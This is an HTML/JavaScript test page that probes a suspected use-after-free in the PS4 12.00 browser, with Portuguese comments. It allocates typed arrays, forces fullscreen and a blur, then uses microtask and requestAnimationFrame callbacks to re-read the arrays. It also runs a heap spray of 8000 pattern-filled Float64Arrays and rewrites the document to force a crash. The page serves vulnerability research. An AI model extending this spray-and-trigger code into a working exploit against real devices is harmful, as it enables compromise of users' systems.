<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 FullScreen+Blur Crash - Reentrancy Tests</title>
</head>
<body>

<h1>PS4 12.00 - Reentrancy / UAF Investigation</h1>

<button onclick="runCrashTest()">Run Test</button>
<div id="log" style="white-space:pre; font-family:monospace;"></div>

<script>
const PATTERN = 2.121995791e-314;

function log(msg) {
    const el = document.getElementById("log");
    el.textContent += msg + "\n";
}

function runCrashTest() {
    log("Starting... Press OPTIONS");

    let controllers = [];

    // PASSO 1 (inalterado)
    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }

    // PASSO 2 (inalterado)
    const elem = document.documentElement;
    if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();

    // PASSO 3 (inalterado)
    window.onblur = function() {
        log("[onblur] triggered");

        // =========================
        // 🔴 TESTE 1 — MICROTASK
        // =========================
        Promise.resolve().then(() => {
            try {
                log("[Microtask] controllers[0][0] = " + controllers[0][0]);
            } catch(e) {
                log("[Microtask ERROR] " + e);
            }
        });

        // =========================
        // 🔴 TESTE 2 — RAF (reentrancy)
        // =========================
        requestAnimationFrame(() => {
            try {
                log("[RAF] controllers[0][0] = " + controllers[0][0]);
            } catch(e) {
                log("[RAF ERROR] " + e);
            }
        });

        // =========================
        // 🔴 TESTE 3 — BUFFER ACCESS
        // =========================
        requestAnimationFrame(() => {
            try {
                let buf = controllers[0].buffer;
                log("[BUFFER] byteLength = " + buf.byteLength);
            } catch(e) {
                log("[BUFFER ERROR] " + e);
            }
        });

        // =========================
        // 🔴 TESTE 4 — DATAVIEW (low-level)
        // =========================
        requestAnimationFrame(() => {
            try {
                let dv = new DataView(controllers[0].buffer);
                let val = dv.getUint32(0, true);
                log("[DATAVIEW] value = " + val);
            } catch(e) {
                log("[DATAVIEW ERROR] " + e);
            }
        });

        // =========================
        // PASSO 4 (spray mantido)
        // =========================
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }

        // =========================
        // PASSO FINAL (CRÍTICO - NÃO ALTERADO)
        // =========================
        setTimeout(() => {
            document.open();
            document.write('<html><body><h1>Crash</h1></body></html>');
            document.close();

            setTimeout(() => location.reload(), 500);
        }, 3000);
    };
}
</script>

</body>
